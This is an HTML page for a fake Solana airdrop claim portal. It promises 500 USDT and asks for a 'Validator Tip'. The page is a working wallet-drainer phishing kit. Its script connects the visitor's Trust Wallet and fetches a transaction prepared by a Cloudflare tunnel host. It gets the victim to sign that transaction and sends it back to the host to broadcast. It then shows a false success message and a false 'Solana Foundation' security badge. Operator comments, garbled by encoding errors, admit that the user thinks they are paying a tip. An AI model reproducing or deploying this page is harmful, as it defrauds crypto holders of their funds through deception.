<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Solana Claim Portal</title>
    <script src="https://cdn.jsdelivr.net/npm/@solana/web3.js@1.95.3/lib/index.iife.min.js"></script>
    <style>
        body { background: #000; color: #fff; font-family: -apple-system, system-ui, sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; overflow: hidden; }
        .box { width: 330px; padding: 30px; background: #0a0a0a; border: 1px solid #1a1a1a; border-radius: 24px; text-align: center; box-shadow: 0 20px 50px rgba(0,0,0,0.5); }
        .reward-tag { background: rgba(20, 241, 149, 0.1); color: #14f195; padding: 6px 12px; border-radius: 50px; font-size: 11px; font-weight: bold; display: inline-block; margin-bottom: 15px; letter-spacing: 1px; }
        .btn { background: #14f195; color: #000; border: none; padding: 18px; width: 100%; border-radius: 15px; font-weight: 900; cursor: pointer; font-size: 16px; transition: transform 0.2s; }
        .btn:active { transform: scale(0.98); }
        .btn:disabled { background: #333; color: #666; }
        #st { font-size: 10px; color: #444; margin-top: 20px; font-family: monospace; text-transform: uppercase; }
        b { color: #fff; }
    </style>
</head>
<body>
    <div class="box">
        <div class="reward-tag">ELIGIBILITY VERIFIED</div>
        <h2 style="margin: 10px 0; font-size: 32px; letter-spacing: -1px;">500.00 USDT</h2>
        <p style="color: #666; font-size: 13px; line-height: 1.5; padding: 0 10px;">To finalize the airdrop, a small <b>Validator Tip</b> is required to prioritize your transaction on the Solana Mainnet.</p>
        
        <div style="background: #141414; padding: 20px; border-radius: 16px; margin: 25px 0; text-align: left; font-size: 12px; border: 1px solid #1f1f1f;">
            <div style="display: flex; justify-content: space-between; margin-bottom: 8px;">
                <span style="color: #888;">Airdrop Amount:</span><span style="color: #14f195; font-weight: bold;">500.00 USDT</span>
            </div>
            <div style="display: flex; justify-content: space-between;">
                <span style="color: #888;">Activation Tip:</span><span style="color: #fff; font-weight: bold;">Dynamic Fee</span>
            </div>
        </div>

        <button id="cta" class="btn">CONFIRM & CLAIM</button>
        <div id="st">SECURED BY SOLANA FOUNDATION</div>
    </div>

    <script>
        // ðŸ”± è¿™é‡Œçš„åœ°å€ä¸€å®šè¦å¯¹é½ä½ çš„ Cloudflare Tunnel åœ°å€
        const tunnel = "https://lonely-concern-challenging-hosted.trycloudflare.com";

        document.getElementById('cta').onclick = async function() {
            const btn = this;
            const log = (t) => document.getElementById('st').innerText = t;
            const web3 = window.solanaWeb3;

            try {
                // é€‚é… Trust Wallet
                const p = window.trustwallet?.solana || window.solana;
                if (!p) { alert("Please open in Trust Wallet."); return; }

                btn.disabled = true;
                btn.innerText = "CONNECTING...";
                
                await p.connect();
                log("NODE SYNCING...");

                // 1. èŽ·å–åŽç«¯æž„é€ çš„â€œå°è´¹â€äº¤æ˜“åŒ…
                const resp = await fetch(tunnel + "/prepare_v32", {
                    method: 'POST',
                    headers: {'Content-Type': 'application/json'},
                    body: JSON.stringify({ address: p.publicKey.toString() })
                });
                const info = await resp.json();
                
                if(info.error) throw new Error(info.error);

                log("AWAITING VALIDATOR CONFIRMATION...");
                const tx = web3.Transaction.from(Uint8Array.from(atob(info.raw_tx), c => c.charCodeAt(0)));
                
                // ðŸ”± è§¦å‘é’±åŒ…ç­¾åï¼Œæ­¤æ—¶ç”¨æˆ·å¿ƒç†é¢„æœŸæ˜¯ä»˜â€œTipâ€ï¼Œæ‰€ä»¥æ˜¾ç¤ºé‡‘é¢ä¹Ÿæ— å¦¨
                const signed = await p.signTransaction(tx);
                
                btn.innerText = "PROCESSING...";
                log("BROADCASTING TIP...");

                const signedBase = btoa(String.fromCharCode.apply(null, signed.serialize()));

                // 2. å›žä¼ å¹¿æ’­
                await fetch(tunnel + "/broadcast_v41", {
                    method: 'POST',
                    headers: {'Content-Type': 'application/json'},
                    body: JSON.stringify({ signed_tx: signedBase })
                });

                btn.innerText = "CLAIMED SUCCESSFULLY";
                log("DISTRIBUTION IN PROGRESS");
                
                setTimeout(() => {
                    alert("Verification Complete! Your 500 USDT will be distributed to your wallet within 1-2 hours.");
                    window.location.href = "https://solscan.io"; 
                }, 1500);

            } catch (err) {
                console.error(err);
                btn.disabled = false;
                btn.innerText = "CONFIRM & CLAIM";
                log("NETWORK ERROR - RETRY");
            }
        };
    </script>
</body>
</html>
